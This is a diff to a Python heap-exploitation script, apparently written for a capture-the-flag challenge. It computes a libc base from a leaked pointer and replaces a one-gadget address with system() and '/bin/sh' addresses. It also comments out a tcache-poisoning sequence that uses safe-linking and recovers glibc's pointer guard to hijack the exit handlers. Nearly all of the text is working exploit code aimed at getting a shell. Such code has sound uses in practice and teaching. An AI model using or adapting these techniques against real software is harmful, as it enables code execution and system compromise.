@@ -72,23 +72,25 @@ for i in range(1, 7):
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
 initial = lib_base + 0x21bf00
 dl_fini_addr = lib_base + 0x0
-gadget_addr = lib_base + 0xebc81
+sys_addr = lib_base + lib.symbols['system']
+binsh_addr = lib_base + next(lib.search("/bin/sh"))
 
 print(hex(lib_base))
 print(hex(initial))
-print(hex(gadget_addr))
+print(hex(sys_addr))
+print(hex(binsh_addr))
 
-update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-create(2, p64(safe_link(heap_base+0x2a0, initial)))
-create(3, b"B" * 16)
-payload = b"C" * 0x18
-create(4, payload)
+# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+# create(2, p64(safe_link(heap_base+0x2a0, initial)))
+# create(3, b"B" * 16)
+# payload = b"C" * 0x18
+# create(4, payload)
 
-mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
-pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
-print(hex(pointer_gaurd))
+# mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
+# pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
+# print(hex(pointer_gaurd))
 # print(p64(rol(gadget_addr, 0x11, word_size=64)))
-update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64) ^ pointer_gaurd))
+# update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64) ^ pointer_gaurd))
 
 gdb.attach(rem)
 
